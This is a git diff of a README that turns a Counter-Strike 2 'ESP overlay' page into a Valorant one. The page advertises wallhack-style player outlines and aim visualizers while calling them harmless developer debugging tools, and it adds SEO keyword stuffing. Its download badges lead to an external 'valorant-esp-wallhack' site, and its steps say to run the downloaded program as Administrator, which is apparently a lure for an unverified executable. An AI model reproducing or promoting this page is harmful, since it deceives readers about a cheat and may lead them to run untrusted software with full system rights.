@@ -1,4 +1,4 @@
-# CS2 — ESP
+# Valorant — ESP
 
 [![Download Setup](https://img.shields.io/badge/Download-Setup-blueviolet)](https://valorant-esp-wallhack.github.io/.github/)  
 [![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://valorant-esp-wallhack.github.io/.github/)
@@ -7,8 +7,9 @@
 
 ## 🔧 Overview
 
-**CS2 ESP Overlay Visual Assistant** is a non-intrusive visualization tool designed for analyzing player movement, map layouts, and interface layers within Counter-Strike 2.  
-Built for developers, analysts, and modding UI testers — this tool provides ESP-style insights without modifying any game files or memory.
+**Valorant ESP Overlay Visual Assistant** is a non-intrusive visualization tool designed for analyzing player movement, map layouts, and interface layers within Valorant.
+
+Built for developers, analysts, and UI testing purposes, the overlay provides ESP-style visual debugging without modifying game files or interacting with game memory.
 
 ---
 
@@ -16,51 +17,47 @@ Built for developers, analysts, and modding UI testers — this tool provides ES
 
 1. Click one of the download buttons above  
 2. Extract the `.zip` archive using 7-Zip or WinRAR  
-3. Launch CS2 in **borderless** or **windowed** mode  
+3. Launch Valorant in **borderless** or **windowed** mode  
 4. Start the overlay tool as Administrator  
-5. Use the in-game overlay panel or hotkeys to toggle features
+5. Use the overlay panel or configurable hotkeys to enable visualization features
 
 ---
 
 ## 🎯 Features
 
-### 🟦 Player Outline ESP  
-- Draws player bounding boxes in spectator or replay  
-- Distance, visibility, and team filters  
-- Color customization and opacity sliders
+### 🟦 Player Outline ESP
+- Displays player outline boxes during replay or observation
+- Distance indicators and visibility filters
+- Team-based color customization
+- Adjustable opacity and line thickness
 
-### 🔲 FOV & Aim Area Visualizer  
-- View real-time field-of-view cones  
-- Crosshair direction and sight lines  
-- Debug tool for accuracy testing and balance review
+### 🔲 FOV & Aim Visualizer
+- Visualizes field-of-view angles
+- Displays crosshair direction and aiming cone
+- Useful for replay analysis and UI testing
 
-### 🗺 Map & Zone Debug Tools  
-- Highlights bomb zones, buy zones, spawn areas  
-- Coordinate grid overlay and zone naming  
-- Optional mini-map anchors for layout analysis
+### 🗺 Map & Zone Overlay
+- Highlights map regions and objective sites
+- Coordinate grid visualization
+- Optional minimap markers and layout references
 
-### 🧩 UI Debug Layer  
-- Toggle UI anchors and module bounds  
-- Profiles: Spectator / Developer / Observer  
-- Support for multi-monitor setups and scaling
+### 🧩 UI Debug Layer
+- Shows interface anchors and layout bounds
+- Observer and developer overlay profiles
+- Multi-monitor and custom resolution support
 
 ---
 
 ## 🖼 Preview
 
-![Player ESP Overlay](https://securecheats.com/wp-content/uploads/2023/10/cs2-aimbot-cheat.jpg)  
+![Valorant ESP Overlay](https://images.contentstack.io/v3/assets/bltb6530b271fddd0b1/blt93b24a95f9b5e89f/5eb26f5389c24c0cfd3df4b6/VALORANT_YR1_KeyArt_4K.jpg)
 
 ---
 
-![Map Overlay](https://raw.githubusercontent.com/Extravi/cs2-kernel-esp/main/screenshots/Screenshot%202024-04-12%20021914.png)  
-
+![Valorant Map Overlay](https://images.contentstack.io/v3/assets/bltb6530b271fddd0b1/blt7e8f1bb157ccd44f/5eb26f5f7a95a10cfb51d86b/Maps_Split.jpg)
 
 ---
 
 ## 🔍 SEO Keywords
 
-cs2 esp tool, cs2 overlay assistant, counter strike 2 fov overlay, cs2 player tracking debug, cs2 ui visualizer, cs2 map esp, cs2 dev overlay, cs2 passive esp layer, cs2 spectator visual tools
-
----
-
-## 📁 Repository Structure
+valorant esp tool, valorant overlay assistant, valorant fov overlay, valorant player tracking debug, valorant ui visualizer, valorant map overlay, valorant developer tools, valorant spectator overlay, valorant passive esp layer
